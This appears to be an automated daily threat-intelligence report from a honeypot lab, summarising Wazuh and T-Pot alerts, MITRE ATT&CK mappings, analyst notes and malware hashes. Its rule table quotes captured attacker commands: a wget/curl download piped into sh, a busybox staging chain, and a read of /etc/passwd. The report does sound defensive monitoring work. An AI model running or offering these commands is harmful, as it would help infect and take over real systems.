# LearningLab01 Daily Threat Intelligence Report — 2026-09-13

Generated: 2026-09-13T13:15:05.053Z

Report window: 2026-09-12T13:15:05.033Z through 2026-09-13T13:15:05.033Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 98,262 |
| Attack-related alerts | 13,927 |
| Honeypot interactions | 94,898 |
| Authentication failures | 943 |
| Authentication successes | 350 |
| Critical alerts | 15 |
| High alerts | 184 |
| T-Pot artifacts observed | 7 |
| Malicious artifact detections | 5 |

### Notable Observations

- 15 critical-severity alerts require priority review.
- 184 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 2.69:1.
- Country attribution currently covers only 5.79% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110209: T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk (38,531 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 15 | 0.02% |
| High | 184 | 0.19% |
| Medium | 920 | 0.94% |
| Low | 97,143 | 98.86% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 943
- Authentication successes: 350
- Failure-to-success ratio: 2.69:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Network attack | 12,212 | 87.69% |
| Payload delivery | 12,212 | 87.69% |
| Authentication failure | 943 | 6.77% |
| Reconnaissance | 334 | 2.40% |
| Command execution | 203 | 1.46% |
| SMTP attack | 92 | 0.66% |
| Network scan | 78 | 0.56% |
| Web attack | 60 | 0.43% |
| Malware | 36 | 0.26% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 5,692 alerts, representing 5.79% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 92,570 | 94.21% | Not geolocated |
| New Zealand | 2,792 | 2.84% | ████████████████████ |
| United States | 2,666 | 2.71% | ███████████████████ |
| United Kingdom | 216 | 0.22% | ██ |
| Germany | 6 | 0.01% | █ |
| Romania | 6 | 0.01% | █ |
| China | 3 | 0.00% | █ |
| Iran | 3 | 0.00% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Initial Access | 305 |
| Defense Evasion | 294 |
| Persistence | 293 |
| Privilege Escalation | 293 |
| Lateral Movement | 98 |
| Credential Access | 27 |
| Execution | 26 |
| Command and Control | 18 |
| Impact | 11 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 293 |
| Remote Services | 98 |
| Brute Force | 27 |
| Command and Scripting Interpreter | 26 |
| Ingress Tool Transfer | 18 |
| Exploit Public-Facing Application | 12 |
| Stored Data Manipulation | 11 |
| Disable or Modify Tools | 1 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110209 | 5 | 38,531 | T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk | tpot (38,531) |
| 110207 | 5 | 16,128 | T-Pot SentryPeer SIP activity from [IP address]:55100, method INVITE | tpot (16,128) |
| 110205 | 6 | 12,136 | T-Pot Honeytrap received a payload from [IP address] | tpot (12,136) |
| 110204 | 4 | 11,434 | T-Pot Honeytrap connection from [IP address] to port 5909 | tpot (11,434) |
| 110213 | 4 | 8,996 | T-Pot RDP connection from [IP address] to port 3389. | tpot (8,996) |
| 110219 | 4 | 5,481 | T-Pot CiscoASA web activity from [IP address]: Request timed out: TimeoutError('The read operation timed out') | tpot (5,481) |
| 110101 | 3 | 1,316 | Cowrie SSH connection from [IP address]. | tpot (1,316) |
| 110201 | 4 | 1,311 | T-Pot Dionaea mssqld connection from [IP address] to port 1433 | tpot (1,311) |
| 110102 | 5 | 943 | Cowrie failed login from [IP address] using username admin. | tpot (943) |
| 110216 | 4 | 248 | T-Pot Mailoney received SMTP command from [IP address]: EHLO User  | tpot (248) |
| 533 | 7 | 238 | Listened ports status (netstat) changed (new port opened or closed). | tpot (238) |
| 5501 | 3 | 195 | PAM: Login session opened. | tpot (193), wazuh (2) |
| 110104 | 7 | 180 | Cowrie captured a command from [IP address]: config terminal | tpot (180) |
| 5502 | 3 | 172 | PAM: Login session closed. | tpot (170), wazuh (2) |
| 110221 | 7 | 133 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /appGet.cgi?hook=get_cfg_clientlist() HTTP/1.1" 404 - | tpot (133) |
| 5715 | 3 | 98 | sshd: authentication success. | tpot (97), wazuh (1) |
| 110217 | 7 | 92 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: AUTH LOGIN  | tpot (92) |
| 110212 | 10 | 76 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (76) |
| 110215 | 4 | 76 | T-Pot MiniPrint event: connection, action open_conn, Connection opened | tpot (76) |
| 110220 | 8 | 75 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (75) |
| 110214 | 9 | 67 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (67) |
| 110223 | 5 | 60 | T-Pot HoneyAML received  request from  to  on port . | tpot (60) |
| 110103 | 10 | 57 | Cowrie accepted login from [IP address] using username draytek. | tpot (57) |
| 510 | 7 | 41 | Host-based anomaly detection event (rootcheck). | wazuh (40), tpot (1) |
| 110208 | 7 | 28 | T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:5266 | tpot (28) |
| 110106 | 10 | 27 | Cowrie detected repeated failed logins from [IP address]. | tpot (27) |
| 203 | 9 | 26 | Agent event queue is full. Events may be lost. | tpot (26) |
| 110108 | 12 | 14 | Cowrie captured suspicious execution or staging activity from [IP address]: >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x55\x58\x48\x52\x45\x4d' | tpot (14) |
| 110225 | 13 | 12 | T-Pot HoneyAML detected a probable remote-code-execution and payload-delivery attempt from [IP address]. | tpot (12) |
| 110211 | 9 | 11 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (11) |
| 202 | 7 | 11 | Agent event queue is 90% full. | tpot (11) |
| 205 | 3 | 11 | Agent event queue is back to normal load. | tpot (11) |
| 592 | 8 | 11 | Log file size reduced. | tpot (11) |
| 110107 | 12 | 6 | Cowrie captured a probable payload-retrieval command from [IP address]: UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@[IP address]:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh telnet >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://[IP address]/sh \|\| curl -sk https://[IP address]/sh) \| sh -s telnet; fi; rm -rf sshcfg key.ppk out_sh; echo -e "\x72\x65\x64\x74\x61\x69\x6C\x5F\x62\x6F\x74\x5F\x74\x65\x6C\x6E\x65\x74\x5F\x6F\x6B" | tpot (6) |
| 110105 | 12 | 4 | Cowrie captured a file download from [IP address]. | tpot (4) |
| 110109 | 13 | 3 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: cat /etc/passwd | tpot (3) |
| 110222 | 9 | 3 | T-Pot CiscoASA detected repeated web requests from one source. | tpot (3) |
| 19004 | 7 | 2 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (2) |
| 19010 | 3 | 2 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure all AppArmor Profiles are in enforce or complain mode.: Status changed from failed to passed | tpot (2) |
| 19011 | 9 | 2 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure all AppArmor Profiles are in enforce or complain mode.: Status changed from passed to failed | tpot (2) |
| 86003 | 3 | 2 | Docker: Error message | tpot (2) |
| 503 | 3 | 1 | Wazuh agent started. | tpot (1) |
| 506 | 3 | 1 | Wazuh agent stopped. | tpot (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 7
- Known hashes: 7
- Uploaded or analyzed: 0
- Malicious detections: 5
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| 0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257 | 46525 | known | 45 | 0 | 21 | [Open](https://www.virustotal.com/gui/file/0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257) |
| d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0 | 153208 | known | 41 | 0 | 23 | [Open](https://www.virustotal.com/gui/file/d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0) |
| 76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64 | 239388 | known | 39 | 0 | 22 | [Open](https://www.virustotal.com/gui/file/76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64) |
| c88e1dacce96cafa2038f7433fc9e42e7b26714c36e98ed59c483360a4b7cb58 | 720896 | known | 35 | 0 | 28 | [Open](https://www.virustotal.com/gui/file/c88e1dacce96cafa2038f7433fc9e42e7b26714c36e98ed59c483360a4b7cb58) |
| a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437 | 334816 | known | 2 | 0 | 57 | [Open](https://www.virustotal.com/gui/file/a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437) |
| ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e | 55 | known | 0 | 0 | 61 | [Open](https://www.virustotal.com/gui/file/ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e) |
| 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca | 405 | known | 0 | 0 | 61 | [Open](https://www.virustotal.com/gui/file/0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca) |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
